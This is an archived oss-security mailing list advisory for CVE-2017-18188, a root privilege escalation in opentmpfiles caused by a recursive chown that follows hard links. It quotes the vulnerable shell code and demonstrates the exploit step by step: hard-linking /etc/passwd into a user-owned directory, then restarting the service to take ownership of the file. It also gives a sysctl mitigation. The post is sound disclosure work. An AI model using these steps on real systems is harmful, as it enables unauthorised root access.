X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3101" "Wednesday" "14" "February" "2018" "16:04:52" "-0500" "Michael Orlitzky" "michael@orlitzky.com" "<11bafb9e-8c50-db0b-4640-65ba072e0eaf@orlitzky.com>" "102" "[oss-security] CVE-2017-18188: opentmpfiles root privilege escalation via recursive chown" nil nil nil "2" "2018021421:04:52" "[oss-security] CVE-2017-18188: opentmpfiles root privilege escalation via recursive chown" (number mark "U       michael@orli Feb 14  102/3101  " thread-indent "\"[oss-security] CVE-2017-18188: opentmpfiles root privilege escalation via recursive chown\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20303 invoked by uid 550); 14 Feb 2018 21:05:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20284 invoked from network); 14 Feb 2018 21:05:11 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=orlitzky.com; s=mail2;
	t=1518642299; bh=aFioq5IVqQSmz4fxq0oA8npmmE1Km+ownpG6iWdc3UA=;
	h=To:From:Subject:Date;
	b=qzuffCIa6kxFyeo4NcAwSkDWcQrX6zPnD/pIpFWSfLBOwhcc7nfNHIvbYHGOsfaHR
	 j48gRASmxyiBrHc/n3Oz0ar4xDk8FYwoiYWULe80c4XM/Duzq0ThIV+7EbPsQRn0PZ
	 ra2s1oFtBhc0ItJ7VF8okEzywouljto30ycpVGXs=
To: oss-security@lists.openwall.com
From: Michael Orlitzky <michael@orlitzky.com>
Message-ID: <11bafb9e-8c50-db0b-4640-65ba072e0eaf@orlitzky.com>
Date: Wed, 14 Feb 2018 16:04:52 -0500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.2
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 8bit
Subject: [oss-security] CVE-2017-18188: opentmpfiles root privilege escalation via recursive
 chown

Product: opentmpfiles
Versions-affected: 0.1.3 and earlier (all)
Author: Michael Orlitzky
Bug-report: https://github.com/OpenRC/opentmpfiles/issues/3


== Summary ==

The opentmpfiles program implements the tmpfiles.d specification for
POSIX systems that do not run systemd. When processing a "Z" type entry,
opentmpfiles calls chown recursively to change ownership of the target
directory and its contents. An attacker can introduce a hard link into
that directory pointing to a sensitive file, and the next time that
opentmpfiles is run, ownership of the hard link's target will be given
to the attacker.


== Details ==

The specification for the Z-type tmpfiles.d entry implies some type of
recursive chown:

  Z

  Recursively set the access mode, group and user, and restore the
  SELinux security context of a file or directory if it exists, as well
  as of its subdirectories and the files contained therein (if
  applicable). Lines of this type accept shell-style globs in place of
  normal path names. Does not follow symlinks.

In opentmpfiles, this is implemented in the "tmpfiles" script:

  _Z() {
    # Recursively set ownership, access mode and relabel security
    # context of a path and all its subdirectories (if it is a
    # directory). Lines of this type accept shell-style globs in
    # place of normal path names.
    [ $CREATE -gt 0 ] || return 0

    CHOPTS=-R relabel "$@"
  }

  relabel() {
    ...
    if [ $uid != '-' ]; then
      dryrun_or_real chown $CHOPTS "$uid" "$path"
      x=$?
      if [ $x -ne 0 ]; then
        status=$x
      fi
    fi
    ...
  }

  dryrun_or_real() {
    local dryrun=
    if [ $DRYRUN -eq 1 ]; then
      dryrun=echo
    fi
    $dryrun "$@"
  }

Ultimately, the target of the Z-type entry has "chown -R" called on
it. By default, chown will refuse to follow symlinks when operating
recursively; however, hard links are another story. Unless some
(nonstandard) kernel-level protection is enabled, unprivileged users
are free to create hard links to root-owned files, and chown will
follow them.

This is straightforward to exploit as the user who owns the target of
a Z-type entry. Take for example the following tmpfiles.d entry, in
/etc/tmpfiles.d/exploit.conf:

  d /var/lib/opentmpfiles-exploit 0755 mjo mjo
  Z /var/lib/opentmpfiles-exploit 0755 mjo mjo

When opentmpfiles is run, ownership of that directory is given to my mjo
user:

  mjo $ sudo /etc/init.d/opentmpfiles-setup start
  mjo $ ls -ld /var/lib/opentmpfiles-exploit
  drwxr-xr-x 2 mjo mjo 4096 Feb 13 18:38 /var/lib/opentmpfiles-exploit

At that point, I'm free to introduce whatever hard links I want,

  mjo $ ln /etc/passwd /var/lib/opentmpfiles-exploit/x

and then restart opentmpfiles (which would happen after a reboot, anyway):

  mjo $ sudo /etc/init.d/opentmpfiles-setup restart

The "chown -R" follows my link, and afterwards I own /etc/passwd:

  mjo $ ls -l /etc/passwd
  -rwxr-xr-x 2 mjo mjo 1504 Feb 13 19:15 /etc/passwd


== Mitigation ==

On Linux, the fs.protected_hardlinks sysctl should be enabled:

  root # sysctl --write fs.protected_hardlinks=1
